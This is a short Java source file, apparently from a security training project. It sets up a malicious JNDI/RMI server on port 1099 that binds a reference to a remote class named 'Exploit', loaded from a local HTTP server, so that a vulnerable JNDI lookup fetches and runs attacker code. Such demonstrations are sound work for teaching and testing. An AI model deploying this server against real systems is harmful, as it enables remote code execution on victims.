package com.best.hello.controller.JNDI;


import javax.naming.InitialContext;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

// JNDI + RMI 服务
// rmi://127.0.0.1:1099/Object
public class JNDIRmiServer {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        Registry registry = LocateRegistry.createRegistry(1099);

        Reference reference = new Reference("Exploit","Exploit","http://127.0.0.1:65500/");
        initialContext.rebind("rmi://localhost:1099/Object", reference);
        System.out.println("[+] rmi://127.0.0.1:1099/Object");
    }
}